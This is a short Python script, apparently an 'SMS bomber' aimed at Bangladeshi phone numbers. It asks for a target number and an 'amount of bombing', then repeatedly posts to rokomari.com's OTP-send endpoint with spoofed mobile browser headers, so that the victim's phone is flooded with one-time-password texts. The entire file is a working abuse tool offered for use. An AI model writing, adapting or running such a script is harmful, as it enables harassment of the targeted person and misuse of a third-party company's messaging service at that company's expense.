import requests
import intro

intro.intro()

intro.slide_view("\033[1;32mEnter Target Phone Number (+88) : \033[1;0m")
phone = input()
intro.slide_view("\033[1;32mEnter Amount of Bombing : \033[1;0m")
amount = int(input())
i =0

while amount>i:
  try:
    #rokomari 
    headers = {
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
      'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-origin',
    }
    
    params = {
        'emailOrPhone': phone,
        'countryCode': 'BD',
    }
    
    response = requests.post('https://www.rokomari.com/otp/send', params=params, headers=headers)
    
    if response.status_code == 200:
      i+=1
      print(f"\033[1;32m[{i}] is Succefully sent ")
      
  except requests.exceptions.ConnectionError:
    print("\033[1;31mTurn on Data or Wifi.")
    exit()
  except:
    print("\033[1;31mSomething Wrong")
    exit()